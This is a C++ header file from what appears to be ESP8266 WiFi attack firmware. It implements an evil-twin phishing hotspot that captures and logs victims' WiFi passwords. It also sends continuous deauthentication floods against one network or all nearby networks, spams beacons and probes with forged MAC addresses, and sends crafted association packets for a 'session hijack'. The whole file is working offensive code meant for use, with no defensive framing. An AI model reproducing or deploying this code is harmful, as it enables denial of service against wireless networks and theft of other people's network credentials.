OP-AMINUL-FF/OPX_my_demon/NETHERCAP_ESP8266/attacks.h
void stopEvilTwin(DNSServer* dns) {
  dns->stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  WiFi.softAP(AP_SSID, AP_PASS, 1, 0, 1);
  delay(100);
  dns->start(DNS_PORT, "*", AP_IP);
  hotspotActive = false;
  phishingStep = 0;
}

bool isRateLimited() {
  unsigned long now = millis();
  if (now - lastCaptureTime < CAPTURE_RATE_LIMIT_MS) return true;
  if (now - captureMinStart > 60000) {
    captureCountThisMin = 0;
    captureMinStart = now;
  }
  if (captureCountThisMin >= CAPTURE_MAX_PER_MIN) return true;
  return false;
}

void addCapturedPassword(String ssid, String pwd, String extra = "") {
  if (isRateLimited()) return;
  lastCaptureTime = millis();
  captureCountThisMin++;

  String encryptedPwd = encryptString(pwd);
  if (capturedCount < CAPTURED_MAX) {
    String entry = "SSID:" + ssid + " PASS:" + encryptedPwd;
    if (extra.length() > 0) entry += " (" + extra + ")";
    capturedPasswords[capturedCount] = entry;
    capturedCount++;
  }
  File logFile = LittleFS.open("/log.txt", "a");
  if (logFile) {
    unsigned long t = millis() / 1000;
    char timeStr[24];
    int n = snprintf(timeStr, sizeof(timeStr), "[%lum %lus]", (unsigned long)(t/60), (unsigned long)(t%60));
    if (n < 0 || n >= (int)sizeof(timeStr)) timeStr[sizeof(timeStr)-1] = '\0';
    logFile.println(String(timeStr) + " [CAPTURED] SSID: " + ssid + " -> PASS: " + encryptedPwd + (extra.length() > 0 ? " " + extra : ""));
    logFile.close();
  }
  updateHeapLowMark();
}

void startSessionHijack(uint8_t* bssid, uint8_t ch) {
  hijackActive = true;
  wifi_set_channel(ch);
}

void stopSessionHijack() {
  hijackActive = false;
}

void sendAssocPacket(uint8_t ch, uint8_t* bssid) {
  uint8_t assocPacket[28] = {
    0x00, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00, 0x01, 0x00, 0x00, 0x00
  };
  wifi_set_channel(ch);
  for (int i = 0; i < 10; i++) {
    wifi_send_pkt_freedom(assocPacket, sizeof(assocPacket), 0);
  }
}

void attackLoop() {
  unsigned long now = millis();

  if (deauthingActive && selectedNetwork.ch > 0 && (now - lastDeauth >= DEAUTH_INTERVAL)) {
    sendDeauth(selectedNetwork.ch, selectedNetwork.bssid, DEAUTH_BURST_COUNT);
    lastDeauth = now;
  }

  if (beaconActive && (now - lastBeacon >= BEACON_INTERVAL)) {
    currentChannel = (currentChannel % CHANNEL_MAX) + 1;
    lastChannelHop = now;
    if (beaconSSIDCount > 0) {
      for (int i = 0; i < beaconSSIDCount && i < 32; i++) {
        uint8_t fakeBSSID[6];
        genRandomMAC(fakeBSSID);
        sendBeacon(currentChannel, beaconSSIDs[i], fakeBSSID, 3);
      }
    } else {
      for (int i = 0; i < MAX_NETWORKS; i++) {
        if (networks[i].ssid.length() > 0) {
          sendBeacon(networks[i].ch, networks[i].ssid, networks[i].bssid, 2);
        }
      }
    }
    lastBeacon = now;
  }

  if (probeActive && (now - lastProbe >= PROBE_INTERVAL)) {
    int sent = 0;
    for (int i = 0; i < MAX_NETWORKS && sent < 5; i++) {
      if (networks[i].ssid.length() > 0) {
        sendProbe(networks[i].ssid, 3);
        sent++;
      }
    }
    if (sent == 0) {
      String randSSID = "AP_" + String(random(1000, 9999));
      sendProbe(randSSID, 5);
    }
    lastProbe = now;
  }

  if (hijackActive && selectedNetwork.ch > 0 && (now - lastHijack >= DEAUTH_INTERVAL)) {
    sendDeauth(selectedNetwork.ch, selectedNetwork.bssid, 30);
    sendAssocPacket(selectedNetwork.ch, selectedNetwork.bssid);
    lastHijack = now;
  }

  if (deauthAllActive && (now - lastDeauthAll >= DEAUTH_INTERVAL * 3)) {
    for (int i = 0; i < MAX_NETWORKS; i++) {
      if (networks[i].ssid.length() > 0) {
        sendDeauth(networks[i].ch, networks[i].bssid, 20);
      }
    }
    lastDeauthAll = now;
  }

  if (preciseDeauthActive && selectedNetwork.ch > 0 && (now - lastPreciseDeauth >= DEAUTH_INTERVAL)) {
    sendPreciseDeauth(selectedNetwork.ch, selectedNetwork.bssid);
    lastPreciseDeauth = now;
  }

  if (trueDeauthActive && (now - lastTrueDeauth >= DEAUTH_INTERVAL * 5)) {
    if (!scanning) {
      scanning = true;
      clearNetworks();
      int n = WiFi.scanNetworks(true);
      unsigned long scanStart = millis();
      while (WiFi.scanComplete() < 0 && (millis() - scanStart) < 3000) { yield(); }
      if (WiFi.scanComplete() > 0) {
        n = WiFi.scanComplete();
        int c = 0;
        for (int i = 0; i < n && c < MAX_NETWORKS; i++) {
          String ssid = WiFi.SSID(i);
          if (ssid.length() == 0) continue;
          bool dup = false;
          for (int j = 0; j < c; j++) {
            if (memcmp(WiFi.BSSID(i), networks[j].bssid, MAC_LEN) == 0) {
              if (WiFi.RSSI(i) > networks[j].rssi) { networks[j].rssi = WiFi.RSSI(i); networks[j].ch = WiFi.channel(i); }
              dup = true; break;
            }
          }
          if (!dup) {
            networks[c].ssid = ssid; networks[c].ch = WiFi.channel(i);
            memcpy(networks[c].bssid, WiFi.BSSID(i), MAC_LEN);
            networks[c].rssi = WiFi.RSSI(i);
            networks[c].encrypted = (WiFi.encryptionType(i) != ENC_TYPE_NONE);
            networks[c].clients = 0; c++;
          }
        }
        WiFi.scanDelete();
      }
      scanning = false;
      for (int i = 0; i < MAX_NETWORKS; i++) {
        if (networks[i].ssid.length() > 0) {
          sendDeauth(networks[i].ch, networks[i].bssid, 15);
        }
      }
    }
    lastTrueDeauth = now;
  }
}

String getAttackStatusJSON() {
  String json = "{";
  json += "\"deauth\":" + String(deauthingActive ? "true" : "false") + ",";
  json += "\"beacon\":" + String(beaconActive ? "true" : "false") + ",";
  json += "\"probe\":" + String(probeActive ? "true" : "false") + ",";
  json += "\"eviltwin\":" + String(hotspotActive ? "true" : "false") + ",";
  json += "\"rogueAP\":" + String(rogueAPActive ? "true" : "false") + ",";
  json += "\"scanning\":" + String(scanning ? "true" : "false") + ",";
  json += "\"captured\":" + String(capturedCount) + ",";
  json += "\"probes\":" + String(probeCount) + ",";
  json += "\"clients\":" + String(clientCount) + ",";
  json += "\"deauthPkts\":" + String(deauthPkts ? deauthPkts : 0) + ",";
  json += "\"beaconPkts\":" + String(beaconPkts ? beaconPkts : 0) + ",";
  json += "\"probePkts\":" + String(probePkts ? probePkts : 0) + ",";
  json += "\"totalPkts\":" + String(totalPkts ? totalPkts : 0);
  json += "}";
  return json;
}
#endif
